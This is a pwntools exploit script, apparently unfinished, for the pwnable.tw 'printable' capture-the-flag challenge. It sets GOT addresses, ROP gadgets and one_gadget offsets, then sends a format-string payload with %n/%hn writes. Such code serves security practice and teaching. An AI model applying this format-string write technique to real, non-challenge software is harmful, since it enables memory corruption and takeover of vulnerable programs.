#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("printable_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

local = True 
if local:
    p = process("./printable_patched")
    gdb.attach(p,'''b*main+131\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./printable_patched', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

#########################

main        = 0x4008cf
puts_got    = 0x600fa8
exit_got    = 0x600ff8
std_err     = 0x601040

rdi_ret     = 0x4009c3
ret         = 0x4006c9

og = [0xef6c4, 0xf0567]
#########################
payload =  b'%64c%10$n%2191c%11$hn%12$p      ' + p64(0x601020+2) + p64(0x601020)
sla(b'Input :', payload)
p.interactive()